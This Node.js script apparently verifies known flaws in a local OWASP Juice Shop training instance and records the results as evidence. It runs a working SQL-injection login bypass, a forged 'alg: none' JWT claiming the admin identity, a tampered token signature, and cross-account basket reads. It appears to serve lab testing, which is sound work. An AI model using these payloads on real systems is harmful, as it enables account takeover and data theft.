const fs = require('node:fs')
const crypto = require('node:crypto')
const base = 'http://127.0.0.1:3000'
const records = []
const ts = new Date().toISOString()

async function waitReady() {
  for (let i = 0; i < 40; i++) {
    try {
      const response = await fetch(base + '/rest/products/search?q=readiness', { signal: AbortSignal.timeout(1000) })
      if (response.status === 200) return
    } catch {}
    await new Promise(resolve => setTimeout(resolve, 500))
  }
  throw new Error('loopback target did not become ready')
}

async function request(id, method, path, body, token) {
  const headers = { accept: 'application/json' }
  if (body !== undefined) headers['content-type'] = 'application/json'
  if (token) {
    headers.cookie = `token=${token}`
    headers.authorization = `Bearer ${token}`
  }
  const rawBody = body === undefined ? '' : JSON.stringify(body)
  const response = await fetch(base + path, { method, headers, body: rawBody || undefined, redirect: 'manual' })
  const text = await response.text()
  const row = {
    id, request: { method, path, headers, body: rawBody },
    response: { status: response.status, headers: Object.fromEntries(response.headers.entries()), body: text }
  }
  records.push(row)
  let parsed
  try { parsed = JSON.parse(text) } catch { parsed = null }
  return { row, parsed }
}

function jwtNone(payload) {
  const b64 = (v) => Buffer.from(JSON.stringify(v)).toString('base64url')
  return `${b64({ typ: 'JWT', alg: 'none' })}.${b64(payload)}.`
}

async function main() {
  await waitReady()
  const version = require('/juice-shop/package.json').version
  const suffix = `${Date.now()}.local`
  const users = {
    a: { email: `k03-a-${suffix}@example.invalid`, password: crypto.randomBytes(24).toString('base64url') },
    b: { email: `k03-b-${suffix}@example.invalid`, password: crypto.randomBytes(24).toString('base64url') }
  }
  await request('health', 'GET', '/rest/products/search?q=canary')
  const invalid = await request('sqli-negative', 'POST', '/rest/user/login', { email: users.a.email, password: 'wrong' })
  const sqli = await request('sqli-historical-shape', 'POST', '/rest/user/login', { email: "' OR 1=1--", password: 'wrong' })
  const adminToken = sqli.parsed?.authentication?.token
  if (adminToken) await request('sqli-identity', 'GET', '/rest/user/whoami', undefined, adminToken)

  for (const key of ['a', 'b']) {
    await request(`register-${key}`, 'POST', '/api/Users/', {
      email: users[key].email, password: users[key].password,
      passwordRepeat: users[key].password, securityQuestion: { id: 1 }, securityAnswer: crypto.randomBytes(24).toString('base64url')
    })
  }
  const accounts = {}
  for (const key of ['a', 'b']) {
    const login = await request(`login-${key}`, 'POST', '/rest/user/login', users[key])
    accounts[key] = {
      token: login.parsed?.authentication?.token,
      basket: login.parsed?.authentication?.bid
    }
    if (accounts[key].token) await request(`identity-${key}`, 'GET', '/rest/user/whoami', undefined, accounts[key].token)
  }
  if (accounts.b?.basket && accounts.b?.token) {
    await request('seed-item-account-b', 'POST', '/api/BasketItems/', {
      BasketId: accounts.b.basket, ProductId: 1, quantity: 1
    }, accounts.b.token)
  }
  if (accounts.a?.basket) await request('bola-a-own', 'GET', `/rest/basket/${accounts.a.basket}`, undefined, accounts.a.token)
  if (accounts.b?.basket) await request('bola-a-reads-b', 'GET', `/rest/basket/${accounts.b.basket}`, undefined, accounts.a.token)
  if (accounts.b?.basket) await request('bola-anonymous-b', 'GET', `/rest/basket/${accounts.b.basket}`)

  const forged = jwtNone({ data: { id: 1, email: 'admin@juice-sh.op' } })
  await request('jwt-none-whoami', 'GET', '/rest/user/whoami', undefined, forged)
  if (accounts.a?.basket) await request('jwt-none-basket', 'GET', `/rest/basket/${accounts.a.basket}`, undefined, forged)
  if (adminToken) {
    const parts = adminToken.split('.')
    if (parts.length === 3) {
      parts[2] = (parts[2] || 'x') + 'x'
      await request('jwt-modified-signature', 'GET', '/rest/user/whoami', undefined, parts.join('.'))
    }
  }

  const out = {
    schema: 'local-k03-capture/1', capturedAt: ts,
    target: { origin: base, product: 'OWASP Juice Shop', version, imageId: 'sha256:0cec496d878c6855a1c81694c9f91564082f418b84aece87538adb8850d2437e' },
    warning: 'PRIVATE LOCAL EVIDENCE. Contains synthetic credentials and bearer tokens. Do not publish or commit.',
    summary: {
      invalidLoginStatus: invalid.row.response.status,
      sqliLoginStatus: sqli.row.response.status,
      sqliReturnedToken: Boolean(adminToken),
      sqliIdentity: records.find(r => r.id === 'sqli-identity')?.response.body,
      accountARegistered: records.find(r => r.id === 'register-a')?.response.status,
      accountBRegistered: records.find(r => r.id === 'register-b')?.response.status,
      accountALogin: records.find(r => r.id === 'login-a')?.response.status,
      accountBLogin: records.find(r => r.id === 'login-b')?.response.status,
      identityA: records.find(r => r.id === 'identity-a')?.response.body,
      identityB: records.find(r => r.id === 'identity-b')?.response.body,
      basketAOwn: records.find(r => r.id === 'bola-a-own')?.response.body,
      basketAReadsB: records.find(r => r.id === 'bola-a-reads-b')?.response.body,
      basketAnonymousB: records.find(r => r.id === 'bola-anonymous-b')?.response.body,
      jwtNoneIdentity: records.find(r => r.id === 'jwt-none-whoami')?.response.body,
      jwtNoneBasket: records.find(r => r.id === 'jwt-none-basket')?.response.body,
      jwtModifiedIdentity: records.find(r => r.id === 'jwt-modified-signature')?.response.body,
      rows: records.map(({ id, request: req, response: res }) => ({ id, method: req.method, path: req.path, status: res.status }))
    },
    records
  }
  const bytes = Buffer.from(JSON.stringify(out, null, 2))
  fs.writeFileSync('/tmp/k03-private-capture.json', bytes, { mode: 0o600 })
  const body = (id) => {
    try {
      const parsed = JSON.parse(records.find(r => r.id === id)?.response.body || 'null')
      return parsed?.data ?? parsed
    } catch { return null }
  }
  const safe = {
    invalidLoginStatus: out.summary.invalidLoginStatus,
    sqliLoginStatus: out.summary.sqliLoginStatus,
    sqliReturnedToken: out.summary.sqliReturnedToken,
    sqliIdentityIsAdmin: body('sqli-identity')?.user?.email === 'admin@juice-sh.op',
    accountARegistered: out.summary.accountARegistered,
    accountBRegistered: out.summary.accountBRegistered,
    accountALogin: out.summary.accountALogin,
    accountBLogin: out.summary.accountBLogin,
    identityAIsAccountA: body('identity-a')?.user?.email === users.a.email,
    identityBIsAccountB: body('identity-b')?.user?.email === users.b.email,
    basketAOwnStatus: records.find(r => r.id === 'bola-a-own')?.response.status,
    basketAReadsBStatus: records.find(r => r.id === 'bola-a-reads-b')?.response.status,
    basketAReadsBIsAccountB: String(body('bola-a-reads-b')?.UserId) === String(body('identity-b')?.user?.id),
    accountBItemAdded: records.find(r => r.id === 'seed-item-account-b')?.response.status,
    accountAReadsAccountBItem: (body('bola-a-reads-b')?.Products || []).some(p => p.id === 1),
    anonymousBasketBStatus: records.find(r => r.id === 'bola-anonymous-b')?.response.status,
    jwtNoneIdentityIsAdmin: body('jwt-none-whoami')?.user?.email === 'admin@juice-sh.op',
    jwtNoneBasketStatus: records.find(r => r.id === 'jwt-none-basket')?.response.status,
    jwtNoneBasketIsAccountA: String(body('jwt-none-basket')?.UserId) === String(body('identity-a')?.user?.id),
    modifiedSignatureHasNoIdentity: !body('jwt-modified-signature')?.user?.email,
    records: out.summary.rows
  }
  console.log(JSON.stringify({ version, captureSha256: crypto.createHash('sha256').update(bytes).digest('hex'), safe }, null, 2))
}

main().catch((e) => { console.error(e.message); process.exit(1) })
